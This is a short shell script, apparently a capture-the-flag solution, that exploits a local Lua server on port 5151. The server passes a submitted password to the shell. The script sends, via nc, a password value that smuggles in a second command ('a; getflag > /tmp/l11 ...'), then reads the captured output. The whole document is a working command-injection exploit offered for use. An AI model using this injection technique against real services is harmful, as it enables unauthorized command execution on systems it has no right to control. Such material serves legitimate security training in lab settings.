#!/bin/sh
# sh pwn.sh  -> the lua server runs our "password" through the shell, oops~ :P
rm -f /tmp/l11
echo 'a; getflag > /tmp/l11 2>&1; chmod 666 /tmp/l11' | nc 127.0.0.1 5151
sleep 1
cat /tmp/l11
